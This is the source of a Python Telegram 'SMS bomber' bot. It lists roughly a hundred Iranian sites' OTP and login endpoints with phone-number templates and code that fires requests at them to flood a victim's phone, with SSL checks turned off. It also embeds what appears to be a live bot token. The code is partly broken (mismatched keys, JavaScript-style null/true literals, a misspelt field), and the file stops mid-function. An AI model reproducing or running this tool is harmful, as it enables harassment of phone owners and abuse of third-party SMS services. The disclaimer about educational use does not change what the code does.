#!/usr/bin/env python3

import asyncio
import aiohttp
import aiogram
import random
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- [ CONFIGURATION ] ---
BOT_TOKEN = "8735707765:AAELATdZIyvOka_RIakWl6-uLCi2FICDjfs"
DEVELOPER_ID = "@SIDIKI_MUSTAFA_92"  # Developer ID
ADMIN_IDS = [8179218740]  # Add admin user IDs here

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()
stop_signals = {}
user_attacks = {}
attack_stats = {}

# --- [ ANIMATION FRAMES ] ---
ANIMATION_FRAMES = [
    "🔄 Processing...",
    "⚡ Firing APIs...", 
    "🔥 Bombarding...",
    "💥 Exploding...",
    "🚀 Launching...",
    "🎯 Targeting..."
]

# --- [ ULTIMATE API COLLECTION - FIXED ] ---
ULTIMATE_APIS = [
    {
        "source": "neshan.org",
        "url": "https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=0{phone}&uuid=web_019e8459-9674-749c-bfe3-7b0364eba2d9",
        "method": "GET",
        "capacity": 10,
        "ticket": 20
    },
    {
        "source": "#karnaval.ir",
        "url": "https://www.karnaval.ir/api/gateway/marketing-campaign-mobile-popup/marketing-campaign-mobile-popup/create",
        "json": {
            "campaignId":"000000000000000000000001",
            "mobile":"0{phone}"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 5
    },
    {
        "source": "balad.ir",
        "url": "https://account.api.balad.ir/api/web/auth/login/",
        "json": {
            "phone_number":"0{phone}",
            "os_type":"W"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 30
    },
    {   
        "source": "keylid.com",
        "url": "https://api.accounts.keylid.com/api/auth/v2/users/register/",
        "json": {
            "phone_number":"98{phone}",
            "srv":"itunes"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 34
    },
    {
        "source": "vmusic.ir",
        "url": "https://api.vmusic.ir/auth/otp/request",
        "json": {
            "mobile":"0{phone}"
        },
        "method": "POST",
        "capacity": 15,
        "ticket": 20
    },
    {   
        "source": "nazdikeh.com",
        "url": "https://www.nazdikeh.com/api/customers/login-register",
        "data": {
            "step": 1,
            "ReturnUrl": "/",
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 30,
        "ticket": 54
    },
    {
        "source": "janebi.com",
        "url": "https://janebi.com/signin",
        "data": {
            "user_mobile":"0{phone}",
            "confirm_code": "",
            "popup": 1,
            "signin": 1
        },
        "method": "POST",
        "capacity": 30,
        "ticket": 44
    },
    {
        "source": "mizamon.com",
        "url": "https://mizamon.com/wp-admin/admin-ajax.php",
        "data": {
            "login_method": "code",
            "phone_number": "0{phone}",
            "action": "ehraz_sms_otp_phone_verify",
            "ehraz_nonce": "1d51bec07c"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 32
    },
    {
        "source": "sepehrcc.com",
        "url": "https://app.sepehrcc.com/newapi/v1/Auth/Register/Mobile/0{phone}",
        "method": "GET",
        "capacity": 39,
        "ticket": 62
    },
    {
        "source": "70kala.ir",
        "url": "https://70kala.ir/wp-json/pinova/user/authenticate",
        "json": {
            "identifier": "0{phone}"
        },
        "method": "POST",
        "capacity": 12,
        "ticket": 36
    },
    {
        "source": "#mobile140.com",
        "url": "https://eloquent-feistel-xpkrs3vmp6.liara.run/api/send",
        "json": {
            "type": "event",
            "payload": {
                "website": "32e11191-2e9b-41df-80ca-fb209d727569",
                "hostname": "mobile140.com", "screen": "1566x364", 
                "language": "en-US", 
                "url":"/login?view=confirm&mobile=0{phone}&exist=false&redirect=/",
                "referrer":"/login?redirect=/"
            }
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 43
    },
    {
        "source": "aloghesti.com",
        "url": "https://api.aloghesti.com/api/v1/initial-user",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 38
    },
    {
        "source": "doozshop.com",
        "url": "https://doozshop.com/wp-admin/admin-ajax.php",
        "data": {
            "action": "mobile_login",
            "mobile": "0{phone}",
            "step": "send_code"
        },
        "method": "POST",
        "capacity": 22,
        "ticket": 38
    },
    {   
        "source": "iranmojo.com",
        "url": "https://iranmojo.com/wp-admin/admin-ajax.php",
        "data": {
            "recaptcha_token": null,
            "phone": "09377972212",
            "controller": "auth-register_phone",
            "action": "iranmojo_guest",
            "dev": 2024
        },
        "method": "POST",
        "capacity": 32,
        "ticket": 47
    },
    {
        "source": "#19kala.com",
        "url": "https://www.19kala.com/users/register",
        "json": {
            "mobile": "0{phone}",
            "password": "12345678e",
            "agree": 1
        },
        "method": "POST",
        "capacity": 17,
        "ticket": 43
    },
    {
        "source": "#abadis.ir",
        "url": "https://abadis.ir/user/ajaxcmd/registernew/",
        "data": {
            "loginID": "0{phone}"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 29
    },
    {
        "source": "#alibaba.ir",
        "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
        "json": {
            "phoneNumber": "{phone}"
        },
        "method": "POST",
        "capacity": 8,
        "ticket": 62
    },
    {
        "source": "#anardoni.com",
        "url": "https://api.anardoni.com/api/v2/auth/v2/send_code",
        "json": {
            "mobile": "0{phone}",
            "verify_code_type": "login"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 43
    },
    {
        "source": "#anten.ir",
        "url": "https://api2.anten.ir/ids/api/auth/register",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#azki.com",
        "url": "https://www.azki.com/api/core/v2/app/auth/check-login-availability/",
        "json": {
            "phoneNumber": "0{phone}",
            "origin": "www.azki.com"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#banimode.com",
        "url": "https://mobapi.banimode.com/api/v2/auth/request",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#boghrat.com",
        "url": "https://admapi.boghrat.com/boghratsite/Account/RegisterOTP",
        "json": {
            "Phonenumber": "0{phone}",
            "recaptcha": null,
            "AppointmentCode": ""
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#dastyar.io",
        "url": "https://api.dastyar.io/express/subscription/sendSms",
        "json": {
            "phoneNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#delino.com",
        "url": "https://www.delino.com/User/PreRegister",
        "data": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#ebpnovin.com",
        "url": "https://www.ebpnovin.com/index.php?route=users/login",
        "data": {
            "username": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#esam.ir",
        "url": "https://api.esam.ir/api/account/v3/RegisterUserv3",
        "json": {
            "mobile": "0{phone}",
            "present_type": "WebApp",
            "registration_method": 0,
            "serialNumber": ""
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#files.ir",
        "url": "https://my.files.ir/api/v1/mobile/sms/forgot-password/send",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#flytoday.ir",
        "url": "https://www.flytoday.ir/api/collect",
        "json": {
            "plaintext": "+98{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#hiss.ir",
        "url": "https://hiss.ir/bakala/ajax/send_code/",
        "data": {
            "action": "bakala_send_code",
            "phone_email": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#iranconcert.com",
        "url": "https://www.iranconcert.com/user/check",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#iranecar.ir",
        "url": "https://nextapi.iranecar.com/auth/api/v1/User/GetUserBaseInfo",
        "json": {
            "emailOrNumber": "0{phone}",
            "userType": "siteUser"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#itoll.com",
        "url": "https://app.itoll.com/api/v1/auth/login",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#kanape.ir",
        "url": "https://api.kanape.ir/v4/auth/otp",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 9,
        "ticket": 0
    },
    {
        "source": "#lastsecond.ir",
        "url": "https://api.lastsecond.ir/auth/register/token",
        "json": {
            "firstName": "\u00da\u2020",
            "lastName": "\u00d9\u201a",
            "username": "0{phone}",
            "referralCode": "",
            "termsAndConditions": true
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 0
    },
    {
        "source": "#lenz.ir",
        "url": "https://api-v3.lenz.ir/api/v3/user-management/otp/register",
        "json": {
            "msisdn": "98{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 0
    },
    {
        "source": "#malltina.com",
        "url": "https://api.malltina.com/api/v2/check-user",
        "json": {
            "user": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#mizito.ir",
        "url": "https://app.mizito.ir/capi/session/register",
        "json": {
            "step": 1,
            "activate_method": "sms",
            "email": "",
            "phone": "0{phone}",
            "username": "0{phone}",
            "pin_code": "",
            "firstname": "",
            "lastname": "",
            "workspace_name": "",
            "password": "",
            "repassword": "",
            "teammates": [
                {
                    "name": "",
                    "email_phone": ""
                }
            ],
            "validated": false
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#netbarg.com",
        "url": "https://netbarg.com/tehran/users/loginByMobile/",
        "json": {
            "_method": "POST",
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 0
    },
    {
        "source": "#okcs/com",
        "url": "https://okcs.com/users/mobilelogin",
        "data": {
            "mobile": "0{phone}",
            "url": "https://okcs.com/"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#ravandarman.com",
        "url": "https://papi.ravandarman.com/register/fast",
        "json": {
            "firstName": "f",
            "lastName": "q",
            "gender": 0,
            "registerField": "tel",
            "termsAndConditions": true,
            "tel": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 0
    },
    {
        "source": "#sheypoor.com",
        "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
        "josn": {
            "username": "0{phone}"
        },
        "method": "POST",
        "capacity": 0,
        "ticket": 0
    },
    {
        "source": "#simcart.com",
        "url": "https://simcart.com/api/v1/users/login-v2/login-type/",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 0
    },
    {
        "source": "abantether.com",
        "url": "https://api.abantether.com/api/v2/auths/register/phone/send",
        "json": {
            "phone_number": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "abrehamrahi.ir",
        "url": "https://abrehamrahi.ir/api/v6/profile/auth/generate-code/",
        "json": {
            "phone": "{phone}",
            "prefix": "+98"
        },
        "method": "POST",
        "capacity": 2,
        "ticket": 63
    },
    {
        "source": "achareh.co",
        "url": "https://api.achareh.co/v2/accounts/login/?web=true",
        "json": {
            "phone": "+98{phone}",
            "context": "general"
        },
        "method": "POST",
        "capacity": 4,
        "ticket": 65
    },
    {
        "source": "andarz.io",
        "url": "https://api.andarz.io/api/v2/auth/signup/otp/",
        "json": {
            "phone_number": "0{phone}"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 65
    },
    {
        "source": "axon.me",
        "url": "https://axon.me/services/api/identity-service/v1/users/register-login/phr",
        "json": {
            "phoneNumber": "0{phone}",
            "serviceName": "AXON",
            "needTag": true,
            "sendAudioOtp": false
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 64
    },
    {
        "source": "balad.ir",
        "url": "https://account.api.balad.ir/api/web/auth/login/",
        "json": {
            "phone_number": "0{phone}",
            "os_type": "W"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "basalam.com",
        "url": "https://services.basalam.com/web/v1/auth/captcha/otp-request",
        "json": {
            "mobile": "0{phone}",
            "client_id": "11",
            "login_by_backup_mobile": false
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 14
    },
    {
        "source": "bertina.ir",
        "url": "https://llm.bertina.ir/api/auth/send-otp",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "bimebazar.com",
        "url": "https://bimebazar.com/accounts/api/login_sec/",
        "json": {
            "username": "0{phone}",
            "type": "sms"
        },
        "method": "POST",
        "capacity": 7,
        "ticket": 11
    },
    {
        "source": "bitpin.ir",
        "url": "https://api-sejel.bitpin.ir/v1/usr/auth/authentication/",
        "json": {
            "password": "12345678e",
            "resend": false,
            "use_voice_call": false,
            "phone": "0{phone}",
            "device_type": "web"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "boofai.com",
        "url": "https://heimdall.boofai.com/api/v1/otp/send",
        "json": {
            "cellphone": "+98{phone}"
        },
        "method": "POST",
        "capacity": 250,
        "ticket": 100
    },
    {
        "source": "booking.ir",
        "url": "https://ws.booking.ir/nagaapi/api/v2/account/sendmobileverificationcode/",
        "json": {
            "mobile": "{phone}",
            "countryCode": "ir"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 65
    },
    {
        "source": "cafebazaar.ir",
        "url": "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest",
        "json": {
            "properties": {
                "language": 2,
                "clientID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf",
                "deviceID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf",
                "clientVersion": "web"
            },
            "singleRequest": {
                "getOtpTokenRequest": {
                    "username": "98{phone}"
                }
            }
        },
        "method": "POST",
        "capacity": 15,
        "ticket": 11
    },
    {
        "source": "digikala.com",
        "url": "https://api.digikala.com/v1/user/authenticate/",
        "json": {
            "backUrl": "/",
            "username": "0{phone}",
            "otp_call": false,
            "hash": null
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "divar.ir",
        "url": "https://api.divar.ir/v5/auth/authenticate",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 15,
        "ticket": 11
    },
    {
        "source": "drnext.ir",
        "url": "https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token",
        "json": {
            "source": "besina",
            "mobile": "0{phone}",
            "key": "U2FsdGVkX1+zCbHc0CmLAG4ebLlQNqHSophwTnPEM0FoXqoRPoDTw++WvlGiPsxHCr4zVSSWjJjbvbep14CVNA=="
        },
        "method": "POST",
        "capacity": 4,
        "ticket": 17
    },
    {
        "source": "drsaina.com",
        "url": "https://www.drsaina.com/api/v2/authentication/request-totp",
        "json": {
            "phoneNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "elanza.com",
        "url": "https://api.elanza.com/auth/request",
        "json": {
            "contact": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "eligasht.com",
        "url": "https://api2.eligasht.com/api/account/register",
        "json": {
            "userName": "0{phone}",
            "recaptchaToken": null
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "eseminar.tv",
        "url": "https://api.eseminar.tv/api/v1/auth/otp/send",
        "json": {
            "method": "register",
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 14
    },
    {
        "source": "faradars.org",
        "url": "https://api.faradars.org/api/client/v1/auth/otp",
        "json": {
            "mobile": "0{phone}",
            "digits": 5,
            "platforms": "web",
            "source": "faradars",
            "recaptcha_token": ""
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "fidibo.com",
        "url": "https://api.fidibo.com/identity/login/prepare",
        "json": {
            "username": "98-{phone}"
        },
        "method": "POST",
        "capacity": 2,
        "ticket": 32
    },
    {
        "source": "footballi.net",
        "url": "https://api.footballi.net/api/v2/user/check",
        "json": {
            "login": "0{phone}",
            "country_code": "+98"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 22
    },
    {
        "source": "gapfilm.ir",
        "url": "https://core.gapfilm.ir/api/v3.2/Account/Login",
        "json": {
            "Method": 1,
            "PhoneNo": "{phone}"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 22
    },
    {
        "source": "gisheh7.ir",
        "url": "https://gateway.gisheh7.ir/user/v1/public/auth/otp/generate",
        "json": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "gsm.ir",
        "url": "https://marketplace.gsm.ir/api/v1/user/login/",
        "json": {
            "phone_number": "+98{phone}"
        },
        "method": "POST",
        "capacity": 2,
        "ticket": 32
    },
    {
        "source": "haal.ir",
        "url": "https://haal.ir/api/v2/ConsultantConsult/CheckConsultantExist",
        "json": {
            "Mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 20
    },
    {
        "source": "hamyarwp.com",
        "url": "https://hamyarwp.com/wp-admin/admin-ajax.php?action=hfl_login_with_phone&t=1776772989081",
        "data": {
            "username": "0{phone}"
        },
        "method": "POST",
        "capacity": 250,
        "ticket": 100
    },
    {
        "source": "metisai.ir",
        "url": "https://api.metisai.ir/api/v1/client/phone-verification/request-otp",
        "json": {
            "phoneNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 39,
        "ticket": 42
    },
    {
        "source": "mrbilit.ir",
        "url": "https://content.mrbilit.ir/sms/get_app/send?to=0{phone}",
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "mrbilit2.ir",
        "url": "https://auth.mrbilit.ir/api/Token/send?mobile=0{phone}",
        "method": "GET",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "namava.ir",
        "url": "https://www.namava.ir/api/v1.0/accounts/login/by-otp/request",
        "json": {
            "UserName": "+98{phone}"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "niazerooz.com",
        "url": "https://my.niazerooz.com/api/account/requestotp",
        "json": {
            "mobile": "0{phone}",
            "registerReturnUrl": ""
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "nobat.ir",
        "url": "https://api.nobat.ir/patient/login/phone",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "okala.com",
        "url": "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
        "json": {
            "mobile": "0{phone}",
            "deviceTypeCode": 10,
            "confirmTerms": true,
            "notRobot": false,
            "otpType": 0,
            "ValidationCodeCreateReason": 5,
            "OtpApp": 0,
            "IsAppOnly": false
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "okian.ai",
        "url": "https://okian.ai/api/auth/submit-phone-number",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "pezeshket.com",
        "url": "https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2",
        "json": {
            "mobileNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 65
    },
    {
        "source": "quera.org",
        "url": "https://quera.org/accounts/api/register/phone/otp",
        "json": {
            "phone_number": "{phone}",
            "country_code": "+98",
            "captcha_token": ""
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "rhino.ir",
        "url": "https://rhino-api.smartbytes.ir/auth/send-otp",
        "json": {
            "phone_number": "0{phone}"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 43
    },
    {
        "source": "ring.ir",
        "url": "https://ring.ir/api/v1/auth/otp",
        "json": {
            "mobile": "+98{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "roboo.ir",
        "url": "https://api.roboo.ir/api/Users/SendVerificationCode?PhoneNumber=0{phone}&code=1302817798429812",
        "method": "POST",
        "capacity": 20,
        "ticket": 27
    },
    {
        "source": "salamati24.com",
        "url": "https://www.salamati24.com/api/activationcode?mobile=0{phone}&as_register=1&roleId=-2",
        "method": "GET",
        "capacity": 20,
        "ticket": 13
    },
    {
        "source": "sanjagh.pro",
        "url": "https://sanjagh.pro/reborn-api/exp/api/session/v2/registerCell",
        "json": {
            "cell": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "sibche.com",
        "url": "https://api.sibche.com/profile/sendCode",
        "json": {
            "mobile": "0{phone}",
            "spec-g": null,
            "g-recaptcha-response": "null"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 22
    },
    {
        "source": "skyroom.online",
        "url": "https://www.skyroom.online/auth/api/authenticate",
        "json": {
            "mobile_number": "0{phone}",
            "country_code": "98"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 8
    },
    {
        "source": "tabdeal.org",
        "url": "https://api-web.tabdeal.org/register/",
        "json": {
            "phone_or_email": "0{phone}"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 43
    },
    {
        "source": "takhfifan.com",
        "url": "https://takhfifan.com/v6/api/magento/login/init",
        "json": {
            "username": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "talasea.ir",
        "url": "https://api.talasea.ir/api/auth/sentOTP",
        "json": {
            "phoneNumber": "0{phone}"
        },
        "method": "POST",
        "capacity": 4,
        "ticket": 65
    },
    {
        "source": "tapsi.ir",
        "url": "https://api.tapsi.ir/api/v2.2/user",
        "json": {
            "credential": {
                "phoneNumber": "0{phone}",
                "role": "DRIVER"
            },
            "otpOption": "SMS"
        },
        "method": "POST",
        "capacity": 10,
        "ticket": 68
    },
    {
        "source": "telewebion.ir",
        "url": "https://gateway.telewebion.ir/shenaseh/api/v2/auth/step-one",
        "json": {
            "phone": "{phone}",
            "code": "98",
            "smsStatus": "1",
            "notification_method": "sms"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "tetherland.com",
        "url": "https://service.tetherland.com/api/v5/login-register",
        "json": {
            "mobile": "0{phone}",
            "device_info": {
                "brand": "",
                "model": "",
                "browserVersion": "147.0",
                "app_version": "",
                "by": "web",
                "osName": "Windows",
                "osVersion": "11",
                "browserName": "Firefox",
                "platform": "web",
                "name": "Windows",
                "device": "web"
            },
            "otp_type": "sms",
            "device": "web"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "torob.com",
        "url": "https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{phone}&source=next_desktop&_landing_page=home",
        "method": "GET",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "tosinso.com",
        "url": "https://tosinso.com/api/auth/send-code",
        "json": {
            "type": "mobile",
            "value": "{phone}",
            "countryCode": "+98"
        },
        "method": "POST",
        "capacity": 5,
        "ticket": 65
    },
    {
        "source": "uploadkon.ir",
        "url": "https://uploadkon.ir/ucp.php?go=sendotp",
        "data": {
            "phone": "0{phone}"
        },
        "method": "POST",
        "capacity": 250,
        "ticket": 100
    },
    {
        "source": "virgool.io",
        "url": "https://virgool.io/api2/app/auth/verify",
        "json": {
            "identifier": "+98{phone}",
            "method": "phone",
            "type": "register"
        },
        "method": "POST",
        "capacity": 3,
        "ticket": 22
    },
    {
        "source": "vmusic.ir",
        "url": "https://api.vmusic.ir/auth/otp/request",
        "json": {
            "mobile": "0{phone}"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "wisgoon.com",
        "url": "https://gateway.wisgoon.com/api/v8/auth/login/",
        "json": {
            "phone": "+98{phone}",
            "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "yarai.ir",
        "url": "https://chat.yarai.ir/api/v1/otps/request-otp",
        "json": {
            "phone": "0{phone}",
            "isAndroid": false
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    },
    {
        "source": "zap-express.com",
        "url": "https://api.zap-express.com/fr/Registration/SendVerificationCode",
        "json": {
            "mobile": "0{phone}",
            "registrationCategoryId": 1,
            "representativeCode": "",
            "utmInfo": {
                "utM_Source": "alopeyk",
                "utM_Medium": "online",
                "utM_Campaign": "site",
                "utM_Content": "",
                "utM_Term": ""
            }
        },
        "method": "POST",
        "capacity": 1,
        "ticket": 62
    },
    {
        "source": "zigap.ir",
        "url": "https://gateway.zigap.ir/api/v1.9/authenticate/sendotp",
        "json": {
            "phoneNumber": "+98{phone}"
        },
        "method": "POST",
        "capacity": 20,
        "ticket": 5
    }
   ]

async def hit_api(session, api, phone, stats):
    """Hit a single API endpoint"""
    try:
        # Get URL and data
        url = api["url"]
        data = api["data"](phone) if api["data"] else None
        
        # Handle callable URLs
        if callable(url):
            url = url(phone)
        
        # Make request
        async with session.request(
            method=api["method"],
            url=url,
            headers=api["headers"],
            data=data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False  # Bypass SSL verification for better success rate
        ) as response:
            status = response.status
            if status in [200, 201, 202, 204]:
                api_type = api.get("type", "SMS")
                stats[api_type] = stats.get(api_type, 0) + 1
                return True
    except Exception as e:
        logger.debug(f"API {api.get('name', 'Unknown')} failed: {str(e)}")
    return False

async def animate_message(chat_id, message_id, text_prefix="", frames=None):
    """Animate a message with loading frames"""
    if frames is None:
        frames = ANIMATION_FRAMES
    
    for frame in frames:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame} {text_prefix}"
            )
            await asyncio.sleep(0.5)
        except:
            break

def create_main_keyboard():
    """Create main reply keyboard"""
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🚀 Start Infinite Boom"))
    builder.row(types.KeyboardButton(text="📊 Check Stats"))
    builder.row(types.KeyboardButton(text="ℹ️ Help"))
    builder.row(types.KeyboardButton(text="👨‍💻 Developer"))
    return builder.as_markup(resize_keyboard=True)

def create_stop_keyboard():
    """Create stop attack keyboard"""
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛑 STOP ATTACK"))
    builder.row(types.KeyboardButton(text="📊 Live Stats"))
    builder.row(types.KeyboardButton(text="🏠 Main Menu"))
    return builder.as_markup(resize_keyboard=True)

def create_stats_inline_keyboard():
    """Create inline keyboard for stats"""
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔄 Refresh Stats", callback_data="refresh_stats"),
        InlineKeyboardButton(text="📈 All Time Stats", callback_data="alltime_stats")
    )
    builder.row(
        InlineKeyboardButton(text="⚡ Fast Attack", callback_data="fast_attack"),
        InlineKeyboardButton(text="🐢 Slow Attack", callback_data="slow_attack")
    )
    return builder.as_markup()

@dp.message(CommandStart())
async def start_command(message: types.Message):
    """Handle /start command"""
    welcome_text = f"""
🎯 <b>CLOUD LEAKED BOMBER BOT</b> 🎯

<b>Developer:</b> {DEVELOPER_ID}
<b>Active APIs:</b> {len(ULTIMATE_APIS)}
<b>Types:</b> Calls, SMS, WhatsApp

📌 <b>Commands:</b>
• Send 10-digit number to start attack
• Use buttons below for control

🔥 <b>Features:</b>
• Multiple API endpoints
• Real-time stats
• Attack control
• Live animations
• Fast & Slow modes

⚠️ <b>Warning:</b> Use responsibly!
    """
    
    await message.answer(
        welcome_text,
        reply_markup=create_main_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "ℹ️ Help")
async def help_command(message: types.Message):
    """Show help information"""
    help_text = f"""
🆘 <b>HELP & GUIDE</b> 🆘

<b>How to use:</b>
1. Click <b>'🚀 Start Infinite Boom'</b>
2. Send <b>10-digit phone number</b> (without +91)
3. Attack will start automatically
4. Use <b>'🛑 STOP ATTACK'</b> to stop

<b>Available Commands:</b>
• /start - Start bot
• /stats - Show statistics
• /stop - Stop current attack
• /help - This message

<b>Attack Types:</b>
• Calls 📞 - Voice call OTPs
• SMS 📩 - Text message OTPs
• WhatsApp 💬 - WhatsApp messages

<b>Developer:</b> {DEVELOPER_ID}
<b>Support:</b> Contact developer for issues

⚠️ <b>Legal Notice:</b>
This bot is for educational purposes only.
Misuse may lead to legal consequences.
    """
    
    await message.answer(help_text, parse_mode="HTML")

@dp.message(F.text == "👨‍💻 Developer")
async def developer_info(message: types.Message):
    """Show developer information"""
    dev_text = f"""
👨‍💻 <b>DEVELOPER INFORMATION</b>

<b>Developer:</b> {DEVELOPER_ID}
<b>Bot Version:</b> 2.0
<b>Last Updated:</b> {time.strftime('%Y-%m-%d')}

🔧 <b>Technical Details:</b>
• Built with Python & aiogram
• Async requests for speed
• Multi-API support
• Real-time monitoring

📞 <b>Contact:</b>
Telegram: {DEVELOPER_ID}
For support and feature requests

🚀 <b>Features Coming Soon:</b>
• More API endpoints
• Custom attack patterns
• Scheduled attacks
• Advanced analytics

⭐ <b>Please rate and review!</b>
    """
    
    await message.answer(dev_text, parse_mode="HTML")

@dp.message(F.text == "📊 Check Stats")
async def check_stats(message: types.Message):
    """Show current statistics"""
    user_id = message.from_user.id
    stats = attack_stats.get(user_id, {})
    
    if not stats:
        stats_text = "📊 <b>No attack statistics available yet.</b>\nStart an attack to see stats!"
    else:
        calls = stats.get('Call', 0)
